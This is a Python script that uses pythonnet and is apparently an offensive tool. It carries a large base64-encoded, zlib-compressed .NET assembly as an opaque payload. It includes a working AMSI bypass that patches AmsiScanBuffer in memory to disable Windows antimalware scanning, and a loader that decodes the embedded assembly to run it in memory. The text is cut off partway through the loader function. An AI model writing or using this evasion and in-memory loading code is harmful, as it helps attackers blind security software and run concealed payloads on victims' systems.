import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
